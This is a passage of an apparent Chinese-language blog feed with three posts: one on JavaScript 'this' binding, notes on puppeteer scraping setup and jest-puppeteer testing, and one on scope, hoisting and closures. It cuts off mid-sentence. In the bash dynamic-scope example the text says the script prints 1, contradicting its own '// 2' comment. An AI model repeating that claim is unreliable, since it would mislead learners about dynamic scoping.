&lt;figure class=&quot;highlight plain&quot;&gt;&lt;tab
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript系列之this</title>
    <link href="http://zhoushaw.github.io/2019/04/23/learning/font-end/js/JavaScript-this/"/>
    <id>http://zhoushaw.github.io/2019/04/23/learning/font-end/js/JavaScript-this/</id>
    <published>2019-04-23T02:22:35.000Z</published>
    <updated>2019-04-27T13:21:01.130Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在JavaScript语言中存在一个<code>this</code>关键词，这个关键词指的是函数运行时所在的环境。由于函数可以在不同的运行环境执行，所以需要有一种机制，能够在函数体内部获得当前的运行环境（<strong>context</strong>）。所以，<code>this</code>就出现了，它的设计目的就是在函数体内部，指代函数当前的运行环境。</p><p>前一个系列的<strong>作用域</strong>讲过,作用域运用的是词法作用域，意味着是编写时确定的，但<strong>this</strong>与其工作原理完全不同，它的指向并不是编写时确定的，而是运行时确定。</p><h2 id="仅仅是“规则”"><a href="#仅仅是“规则”" class="headerlink" title="仅仅是“规则”"></a>仅仅是“规则”</h2><p>之前在阅读 You Don’t Know JS系列的: <strong>this &amp; Object Prototypes</strong>中，将this的指向总结了几条规则：</p><blockquote><p>函数调用方式与内部<code>this</code>指针关系：</p></blockquote><ol><li>直接调用:函数内部<code>this</code>指向全局对象<code>window</code></li><li>通过对象使用点来调用:函数内部this指向调用对象</li><li>触发事件调用函数:函数内部的<code>this</code>指向触发事件的对象</li><li>以<code>new</code>的方式来调用:函数内部<code>this</code>指向本次函数执行时对应的一个匿名对象（以new的方式创建的函数，函数名的首字母一般以大写字母开始）</li><li>通过<code>call</code>的方法来间接调用方法:函数内部this指向<code>call</code>方法的第一参数对象,我们可以创建结构相同，但内容不同的对象</li></ol><h2 id="不仅仅是“规则”"><a href="#不仅仅是“规则”" class="headerlink" title="不仅仅是“规则”"></a>不仅仅是“规则”</h2><p>参考了上面的规则发现，<code>this</code>的指向无论如何都逃脱不了上面的<strong>5大原则</strong>,那它们之前是否存在一定的规律呢，或者说是什么来决定<code>this</code>的指向的。</p><p>通常我们会对一下例子的结果没法准确的确定<code>this</code>指向：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var name = &apos;zhou&apos;;</span><br><span class="line">var obj = &#123;</span><br><span class="line">    name: &apos;shaw&apos;,</span><br><span class="line">    say: function () &#123;</span><br><span class="line">        console.log(this.name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">obj.say();  </span><br><span class="line"></span><br><span class="line">var say = obj.say;</span><br><span class="line">say();</span><br></pre></td></tr></table></figure><blockquote><p>上面的输出结果会是什么呢：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj.say(); // 输出shaw</span><br><span class="line">say();  // 输出zhou</span><br></pre></td></tr></table></figure><p>为什么这里<code>obj.say</code>和<code>say</code>的输出结果会不一致呢？下面我们来一探究竟。</p><p><code>this</code>的指向与数据在内存里的数据结构有关:</p><p>上面案例里的<code>obj</code>对象是如何在内存中存储的呢</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">obj.say-&gt; &#123;</span><br><span class="line">    [[value]]: say函数地址</span><br><span class="line">    [[write]]: true,</span><br><span class="line">    [[readable]]: true</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上<code>say</code>函数并没有存储在<code>obj</code>对象中，它只存储了<code>say</code>函数的地址。</p><p>我们直接通过<code>obj.say</code>来调用函数，与<code>obj.say</code>赋值给<code>say</code>变量调用完全不同，因为<code>obj</code>中存储的是<code>say函数</code>的地址，我们进行赋值操作时直接将say函数地址直接赋值过去了，而不是我们想象的将<code>obj.say</code>引用赋值过去。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;在JavaScript语言中存在一个&lt;code&gt;this&lt;/code&gt;关键词，这个关键词指的是函数运行时所在的环境。由于函数可以在不同的运行
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>puppeteer爬虫实战</title>
    <link href="http://zhoushaw.github.io/2019/04/23/learning/node/puppeteer/"/>
    <id>http://zhoushaw.github.io/2019/04/23/learning/node/puppeteer/</id>
    <published>2019-04-22T20:18:35.000Z</published>
    <updated>2019-05-12T06:26:35.669Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>待补充….</p><h2 id="centOs7-0无法运行问题"><a href="#centOs7-0无法运行问题" class="headerlink" title="centOs7.0无法运行问题"></a>centOs7.0无法运行问题</h2><p>centos必须升级到7.0以上否则会遇到依赖版本缺失问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yum install ipa-gothic-fonts xorg-x11-fonts-100dpi xorg-x11-fonts-75dpi xorg-x11-utils xorg-x11-fonts-cyrillic xorg-x11-fonts-Type1 xorg-x11-fonts-misc -y</span><br><span class="line"></span><br><span class="line">yum install pango.x86_64 libXcomposite.x86_64 libXcursor.x86_64 libXdamage.x86_64 libXext.x86_64 libXi.x86_64 libXtst.x86_64 cups-libs.x86_64 libXScrnSaver.x86_64 libXrandr.x86_64 GConf2.x86_64 alsa-lib.x86_64 atk.x86_64 gtk3.x86_64 -y</span><br><span class="line"></span><br><span class="line"># 再安装NSS的依赖：</span><br><span class="line">yum install nss.x86_64</span><br><span class="line"></span><br><span class="line"># puppeteer的执行文件中去沙箱运行：</span><br><span class="line">browser = await puppeteer.launch(&#123;</span><br><span class="line">  headless: true,</span><br><span class="line">  args: [&apos;--no-sandbox&apos;, &apos;--disable-setuid-sandbox&apos;]</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="puppeteer启动配置"><a href="#puppeteer启动配置" class="headerlink" title="puppeteer启动配置"></a>puppeteer启动配置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">const puppeteer = require(&apos;puppeteer&apos;);</span><br><span class="line">const browser = await puppeteer.launch([options]);</span><br></pre></td></tr></table></figure><ul><li>options<ul><li>headless <code>&lt;boolean&gt;</code> 以界面形式运行</li><li>devtools <code>&lt;boolean&gt;</code> 打开开发者工具栏</li></ul></li></ul><h2 id="页面对象附带"><a href="#页面对象附带" class="headerlink" title="页面对象附带"></a>页面对象附带</h2><blockquote><p>page.emulate</p></blockquote><p>模仿真实手机</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">const puppeteer = require(&apos;puppeteer&apos;);</span><br><span class="line">const devices = require(&apos;puppeteer/DeviceDescriptors&apos;)</span><br><span class="line"></span><br><span class="line">const page = await browser.newPage();</span><br><span class="line">await page.emulate(devices[&apos;iPhone X&apos;])</span><br><span class="line">await page.goto(&apos;https://www.baidu.com&apos;&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>page.waitFor</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page.waitFor(selectorOrFunctionOrTimeout[, options[, ...args]])</span><br></pre></td></tr></table></figure><p>等待指定dom节点内容渲染完成</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let selector = &apos;.price&apos;;</span><br><span class="line">await page.waitFor(selector =&gt;&#123;</span><br><span class="line">    return (document.querySelector(selector)||&#123;&#125;).innerText;</span><br><span class="line">&#125;, &#123;&#125;, selector);</span><br></pre></td></tr></table></figure><blockquote><p>page.goto(<code>url</code>[, <code>options</code>])</p></blockquote><ul><li>url <code>&lt;string&gt;</code> : 指定跳转地址</li><li>options <code>&lt;Object&gt;</code>:<ul><li><code>networkidle0</code>: 500毫秒内没有任何一个网络请求</li><li><code>networkidle2</code>:  500毫秒内没有超过任何二个网络请求</li><li><code>domcontentloaded</code>: dom装载完成</li></ul></li></ul><h2 id="页面环境执行脚本"><a href="#页面环境执行脚本" class="headerlink" title="页面环境执行脚本"></a>页面环境执行脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">await page.evaluate(() =&gt; &#123;</span><br><span class="line">    let name = window.name;</span><br><span class="line">    return name;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><blockquote><p>page.evaluate(pageFunction[, …args])</p></blockquote><ul><li><code>pageFunction</code>: <code>&lt;Function&gt;</code> 执行脚本，函数在浏览器环境执行，拥有<code>window</code>、<code>document</code>访问权限</li><li><code>...args</code>: <code>&lt;...Serializable|JSHandle&gt;</code>,传入参数，<code>pageFunction</code>无法访问函数外部变量，因为<code>pageFunction</code>内容将会直接当做脚本注入页面</li></ul><p>由于<code>pageFunction</code>函数会直接被注入到页面中，所以无法获取函数外部作用域，只能讲外部参数通过<code>args</code>传入，不能直接将<code>Function</code>传入，只能将函数通过<code>toString</code>后，在通过<code>eval</code>来执行<code>string</code>化后的函数。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">let detect = () =&gt; &#123;</span><br><span class="line">    // ... do some thing</span><br><span class="line">    return &apos;res&apos;;</span><br><span class="line">&#125;;</span><br><span class="line"> const html = await page.evaluate((fn) =&gt; &#123;</span><br><span class="line">        let res = eval(fn)();</span><br><span class="line">        return res;</span><br><span class="line">&#125;, detect.toString());</span><br></pre></td></tr></table></figure><p><strong>注意</strong>：</p><p>页面注入脚本，监听事件失效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">let renderReady = () =&gt; &#123;</span><br><span class="line">      return new Promise((resolve) =&gt; &#123;</span><br><span class="line">          document.onreadystatechange = () =&gt; &#123;</span><br><span class="line">              if (document.readyState === &apos;complete&apos;) &#123;</span><br><span class="line">                  resolve();</span><br><span class="line">              &#125;</span><br><span class="line">          &#125;;</span><br><span class="line">      &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">(async () =&gt; &#123;</span><br><span class="line">    await renderReady()</span><br><span class="line">    console.log(&apos;complete&apos;) // 永远也不会走到这一块来，进入到renderReady后就失效了</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><h2 id="jest-puppeteer"><a href="#jest-puppeteer" class="headerlink" title="jest-puppeteer"></a>jest-puppeteer</h2><p><a href="https://jestjs.io/docs/zh-Hans/puppeteer" target="_blank" rel="noopener">官方文档</a></p><p>使用puppeteer与jest搭配测试：</p><ul><li>依赖安装<code>npm install --save-dev jest-puppeteer puppeteer jest</code></li><li><code>package.json</code>添加<code>&quot;jest&quot;: {&quot;preset&quot;: &quot;jest-puppeteer&quot;}</code>依赖</li></ul><h3 id="TypeScript"><a href="#TypeScript" class="headerlink" title="TypeScript"></a>TypeScript</h3><p>在使用TypeScript中使用<code>puppeteer</code>测试需要注意一下几点：</p><blockquote><p>由于TypeScript需要进行类型检测所以需要在全局环境注入变量</p></blockquote><p>依赖安装：</p><p><code>@types/puppeteer</code>, <code>@types/jest-environment-puppeteer</code></p><p>配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    jest: &#123;</span><br><span class="line">        &quot;globalSetup&quot;: &quot;jest-environment-puppeteer/setup&quot;,</span><br><span class="line">        &quot;globalTeardown&quot;: &quot;jest-environment-puppeteer/teardown&quot;,</span><br><span class="line">        &quot;testEnvironment&quot;: &quot;jest-environment-puppeteer&quot;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>指定输出版本</p></blockquote><p>若输出目标为<code>&quot;target&quot;: &quot;es5&quot;</code>，则会报各种依赖无法查找错误</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ReferenceError: __awaiter is not defined</span><br></pre></td></tr></table></figure><p>解决方案：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// tsconfig.json,文件配置</span><br><span class="line">&#123;</span><br><span class="line">  &quot;compilerOptions&quot;: &#123;</span><br><span class="line">    &quot;target&quot;: &quot;es2017&quot;,</span><br><span class="line">    // ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;待补充….&lt;/p&gt;
&lt;h2 id=&quot;centOs7-0无法运行问题&quot;&gt;&lt;a href=&quot;#centOs7-0无法运行问题&quot; class=&quot;h
      
    
    </summary>
    
      <category term="node" scheme="http://zhoushaw.github.io/categories/node/"/>
    
    
      <category term="node" scheme="http://zhoushaw.github.io/tags/node/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript系列之作用域与闭包</title>
    <link href="http://zhoushaw.github.io/2019/04/21/learning/font-end/js/JavaScript-closure/"/>
    <id>http://zhoushaw.github.io/2019/04/21/learning/font-end/js/JavaScript-closure/</id>
    <published>2019-04-21T01:39:35.000Z</published>
    <updated>2019-04-27T13:21:01.129Z</updated>
    
    <content type="html"><![CDATA[<h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><p>在进入作用域的讨论之前先明什么是作用域，通过一句话简单描述就是：<strong>一组明确定义的规则，它定义如何在某些位置存储变量，以及如何在稍后找到这些变量</strong></p><h3 id="词法作用域"><a href="#词法作用域" class="headerlink" title="词法作用域"></a>词法作用域</h3><p>作用域的工作方式有两种占统治地位的模型。其中的第一种是最最常见，在绝大多数的编程语言中被使用的。它称为 <strong>词法作用域</strong>，我们将深入检视它。另一种仍然被一些语言（比如 Bash 脚本，Perl 中的一些模式，等等）使用的模型，称为 <strong>动态作用域</strong>。</p><p>JavaScript采用的是<strong>词法作用域</strong>，这意味着<strong>作用域</strong>是编写时确定的，而不是运行时确定的，当然也可以通过<strong>欺骗</strong>来达到动态作用域，例如使用：<code>eval</code>、<code>with</code>等关键词</p><blockquote><p>词法分析</p></blockquote><p>JavaScript的代码运行，并不是像你想象的<strong>逐行编译</strong>，而是在进行编译前会进行<strong>词法分析</strong>。也就形成了我们所说的<strong>词法作用域</strong>。</p><p>可以通过下面的🌰来看：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var value = 1;</span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">    console.log(value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function bar() &#123;</span><br><span class="line">    var value = 2;</span><br><span class="line">    foo();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line"></span><br><span class="line">// 结果是 ???</span><br></pre></td></tr></table></figure><p>大多数人看到这个🌰第一个反应结果是：输出<code>2</code>，但是需要注意的是foo的作用域并不存在与<code>bar函数</code>中,因为JavaScript的<code>作用域</code>是词法作用域，所以并不能获取到bar函数中 <code>var value = 2</code>的声明。</p><p>下面我们来简单描述一下这段代码的执行过程：</p><ul><li>在全局环境下声明了<code>value变量</code>、<code>foo函数</code>、<code>bar函数</code></li><li>执行<code>bar函数</code>，</li><li>在函数<code>bar</code>内部声明了<code>value变量</code>并赋值为2</li><li>执行，<code>foo函数</code></li><li>在函数内寻找<code>value变量</code>声明，未找到,向上一层作用域继续寻找</li><li>在顶层作用域<code>window</code>下寻找到了<code>value</code>变量，若直到顶层作用域任未找到则报错</li><li>输出结果<code>1</code></li></ul><h3 id="动态作用域"><a href="#动态作用域" class="headerlink" title="动态作用域"></a>动态作用域</h3><p>上面已经描述了词法作用域的工作方式，这里我们来稍微讲讲与<strong>词法作用域</strong>完全对立的<strong>动态作用域</strong></p><p>我们这里就以bash为例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">value=1</span><br><span class="line">function foo () &#123;</span><br><span class="line">    echo $value;</span><br><span class="line">&#125;</span><br><span class="line">function bar () &#123;</span><br><span class="line">    local value=2;</span><br><span class="line">    foo;</span><br><span class="line">&#125;</span><br><span class="line">bar // 2</span><br></pre></td></tr></table></figure><p>我们将上面代码保存为<code>scope.bash</code>的文件，通过执行<code>bash scope.bash</code>,最终输出<code>1</code></p><h3 id="变量提升"><a href="#变量提升" class="headerlink" title="变量提升"></a>变量提升</h3><p>在代码执行前，引擎会在执行前编译它。编译过程的一部分就是找到<strong>所有的声明</strong>，并将它们<strong>关联在合适的作用域上</strong></p><p>例如这段代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a = 2;</span><br><span class="line"></span><br><span class="line">var a;</span><br><span class="line"></span><br><span class="line">console.log( a );</span><br></pre></td></tr></table></figure><p>当你看到 <code>var a = 2;</code> 时，你可能认为这是一个语句。但是 JavaScript 实际上认为这是两个语句：<code>var a;</code> 和 <code>a = 2;</code></p><ul><li>第一个语句，声明，是在编译阶段被处理的。</li><li>第二个语句，赋值，为了执行阶段而留在 原处。</li></ul><p>于是可以认为代码被处理成这样了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line">a = 2;</span><br><span class="line"></span><br><span class="line">console.log( a );</span><br></pre></td></tr></table></figure><p>关于这种处理的一个有些隐喻的考虑方式是，变量和函数声明被从它们在代码流中出现的位置<strong>“移动”到代码的顶端</strong>。这就产生了<strong>“提升”</strong>这个名字</p><p>需要注意的是：提升是 <strong>以作用域为单位的</strong></p><h4 id="函数优先"><a href="#函数优先" class="headerlink" title="函数优先"></a>函数优先</h4><p>函数声明和变量声明都会被提升。但一个微妙的细节（可以 在拥有多个“重复的”声明的代码中出现）是，<strong>函数会首先被提升</strong>，<strong>然后才是变量</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">foo(); // 1</span><br><span class="line"></span><br><span class="line">var foo;</span><br><span class="line"></span><br><span class="line">function foo() &#123;</span><br><span class="line">console.log( 1 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo = function() &#123;</span><br><span class="line">console.log( 2 );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>将会被转变成：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( 1 );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo(); // 1</span><br><span class="line"></span><br><span class="line">foo = function() &#123;</span><br><span class="line">console.log( 2 );</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意那个 <code>var foo</code> 是一个重复（因此被无视）的声明，即便它出现在 <code>function foo()...</code> 声明之前，因为函数声明是在普通变量之前被提升的。</p><p>虽然<strong>多个/重复的 var</strong>声明实质上是被忽略的，但是后续的函数声明<strong>确实会覆盖前一个</strong>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">    console.log(&apos;a&apos;);</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br><span class="line">function foo () &#123;</span><br><span class="line">    console.log(&apos;b&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实际上转变成了:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function foo () &#123;</span><br><span class="line">    console.log(&apos;b&apos;);</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>闭包对于大多数熟练的JavaScript也算是一个模糊不清的概念，什么是闭包呢，闭包能给我们带来什么好处和坏处？</p><p>简单来说可以用一句话概括闭包的特性与作用：<strong>闭包就是函数能够记住并访问它的词法作用域，即使这个函数在它的词法作用域外执行</strong></p><blockquote><p>让我们跳进代码来说明这个定义：</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a ); <span class="comment">// 2</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><p>上面的代码段被认为是函数 bar() 在函数 foo() 的作用域上有一个 闭包.换一种略有不同的说法是，bar() 闭住了 foo() 的作用域。为什么？因为 bar() 嵌套地出现在 foo() 内部。就这么简单。</p><p>根据文章上面的<code>作用域</code>我们知道，函数的作用域是<strong>编写时定义</strong>的而不是运行时决定的，所以我们通过函数内部返回函数时，返回出来的函数的作用域链的<strong>起始位置</strong>依然是那个函数内部。由于在函数外部对函数内部值存在引用的关系，<strong>垃圾回收机制</strong>并不会将变量回收而是会一直在函数内部引用。</p><h3 id="闭包的特性"><a href="#闭包的特性" class="headerlink" title="闭包的特性"></a>闭包的特性</h3><p>根据闭包的定义我们能很容易记住其两大特点：</p><p>1、能够记住并访问它的词法作用域<br>2、即使在它的作用域外执行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">bar</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> bar;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> baz = foo();</span><br><span class="line"></span><br><span class="line">baz(); <span class="comment">// 2 -- 哇噢，看到闭包了，伙计。</span></span><br></pre></td></tr></table></figure><ul><li><code>bar()</code> 被执行了，必然的。但是在这个例子中，它是在它被声明的词法作用域 外部 被执行的。</li><li><code>foo()</code> 被执行之后，一般说来我们会期望 <code>foo()</code> 的整个内部作用域都将消失，因为我们知道 引擎 启用了 垃圾回收器 在内存不再被使用时来回收它们。因为很显然 <code>foo()</code> 的内容不再被使用了，所以看起来它们很自然地应该被认为是 消失了。</li><li>但是闭包的“魔法”不会让这发生。内部的作用域实际上 依然 “在使用”，因此将不会消失。谁在使用它？函数 <code>bar()</code> 本身。</li><li>有赖于它被声明的位置，<code>bar()</code> 拥有一个词法作用域闭包覆盖着 <code>foo()</code> 的内部作用域，闭包为了能使 <code>bar()</code> 在以后任意的时刻可以引用这个作用域而保持它的存在。</li><li><code>bar()</code> 依然拥有对那个作用域的引用，而这个引用称为闭包。</li></ul><h3 id="闭包使用场景"><a href="#闭包使用场景" class="headerlink" title="闭包使用场景"></a>闭包使用场景</h3><h4 id="无处不在的闭包"><a href="#无处不在的闭包" class="headerlink" title="无处不在的闭包"></a>无处不在的闭包</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wait</span>(<span class="params">message</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( message );</span><br><span class="line">&#125;, <span class="number">1000</span> );</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wait( <span class="string">"Hello, closure!"</span> );</span><br></pre></td></tr></table></figure><ul><li>我们拿来一个内部函数（名为 timer）将它传递给 setTimeout(..)。但是 timer 拥有覆盖 wait(..) 的作用域的闭包，实际上保持并使用着对变量 message 的引用。</li><li>在我们执行 wait(..) 一千毫秒之后，要不是内部函数 timer 依然拥有覆盖着 wait() 内部作用域的闭包，它早就会消失了。</li><li>在 引擎 的内脏深处，内建的工具 setTimeout(..) 拥有一些参数的引用，可能称为 fn 或者 func 或者其他诸如此类的东西。引擎 去调用这个函数，它调用我们的内部 timer 函数，而词法作用域依然完好无损。</li></ul><h4 id="循环-闭包"><a href="#循环-闭包" class="headerlink" title="循环 + 闭包"></a>循环 + 闭包</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">1</span>; i&lt;=<span class="number">5</span>; i++) &#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( i );</span><br><span class="line">&#125;, i*<span class="number">1000</span> );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这段代码的精神是，我们一般将 期待 